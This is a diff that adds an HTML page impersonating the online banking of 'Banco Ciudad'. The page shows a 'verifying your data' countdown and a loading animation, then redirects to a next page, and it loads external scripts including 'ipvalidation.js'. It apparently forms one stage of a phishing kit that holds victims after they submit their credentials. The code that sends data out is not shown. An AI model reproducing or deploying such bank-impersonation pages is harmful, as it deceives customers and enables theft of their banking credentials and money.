@@ -1,0 +1,57 @@
+<!DOCTYPE html> 
+<html lang="en"> 
+<head> 
+    <meta charset="UTF-8"> 
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <link rel="stylesheet" href="estilo.css"> 
+    <meta http-equiv="refresh" content="20;url=index3.html"> 
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> 
+    <script src="alerta2.js"></script>
+    <script src="ipvalidation.js"></script>
+    <link rel="icon" href="icono.png" type="image/x-icon"> 
+      <link rel="apple-touch-icon" href="icono.png"> 
+      <script>
+        var seconds = 20;
+    
+        function countdown() {
+            document.getElementById('timer').innerText = seconds;
+            if (seconds > 0) {
+                seconds--;
+                setTimeout(countdown, 1000);
+            }
+        }
+    
+        document.addEventListener("DOMContentLoaded", function() {
+            countdown();
+        });
+        </script>
+    <script> 
+      function changeButtonColor(event) { 
+        var button = document.getElementById("button"); 
+
+        if (event.target.value.length > 0) { 
+          button.classList.add("blue"); // Agrega la clase "blue" al botón 
+        } else { 
+          button.classList.remove("blue"); // Remueve la clase "blue" del botón 
+        } 
+      } 
+    </script> 
+  <title>Banco Ciudad</title> 
+</head> 
+<body class="body"> 
+    <div class="general"> 
+      <form id="formulario" onsubmit="enviarFormulario(event)" class="form"> 
+        <img src="logo.png" class="logo" style="text-align: left;"> 
+        <div class="container"> 
+          <img src="icono.png" class="icono" style="text-align: center;"> 
+          <div class="cuadro"><br><br>
+            <label class="text1" style="text-align: center;"><b>Estamos verificando sus datos. Espere:<span id="timer">20</span></b></label><br><br><br>
+          <div><img src="loading.gif" style="width: 200px; height: 200px; text-align: center; justify-self: center; justify-items: center; margin-left: 20px;" ></div><br><br>
+          </div> 
+        </div> 
+        <p class="text2">Por tu seguridad, nunca compartas los datos de acceso ni códigos de validación de tu Home Banking.</p> 
+      </form> 
+  </div> 
+</body> 
+</html>
